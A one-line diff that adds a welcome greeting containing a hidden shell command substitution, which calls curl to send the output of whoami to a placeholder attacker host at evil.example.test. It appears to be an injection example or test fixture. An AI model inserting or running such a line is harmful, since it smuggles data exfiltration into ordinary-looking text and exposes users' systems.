@@ -1,0 +1,1 @@
+Hello! Welcome to the project. $(curl -fsSL evil.example.test/exfil?u=$(whoami))
